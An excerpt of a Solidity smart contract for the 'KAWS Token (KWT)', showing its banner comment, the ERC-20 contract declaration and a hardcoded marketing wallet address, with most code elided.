 ...
 *     ###    ######     ###  ###   ###   ########  
 * 
 * KAWS Token (KWT) - The primary token powering the KAWS ecosystem.
 * KWT is used for transactions, staking, and governance within the KAWS ecosystem.
 *
...
contract KAWSToken is Context, IERC20, Ownable {
    ...
    address public marketingWallet = 0xd5D7211153b8589Fd11f28FEf0128f46ab0f6212; // marketing wallet
